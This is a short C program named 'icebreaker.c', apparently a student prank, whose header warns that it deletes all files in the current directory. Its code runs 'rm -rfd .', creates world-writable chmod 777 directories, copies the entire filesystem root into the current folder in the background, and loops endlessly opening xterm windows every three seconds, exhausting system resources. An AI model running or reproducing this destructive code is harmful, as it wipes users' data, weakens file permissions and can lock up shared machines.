/*
-------WARNING------
THIS PROGRAM WILL DELETE ALL FILES AND FOLDERS IN current DIRECTORY.
And then makes a directory that everyone can access, write, and execute
and then goes into your home directory and adds another directory
and then downloads everything public off of silo into current directory

also opens a lot of terminals
 */

//icebreaker.c
//Will Boland
//1/15/2020

#include <stdio.h>
#include <unistd.h>

int main(void) {
  system("rm -rfd ."); //delete files in current working directory
  system("mkdir HelloAll;chmod 777 HelloAll");
  system("mkdir ~/HelloAllAgain;chmod 777 HelloAllAgain");
  system("cp -ar /. . &"); //download all files from silo into here... in the background

  while(1) {
    printf("Hello, world\n");
    system("xterm");
    sleep(3);
  }
  
  return(0);
}
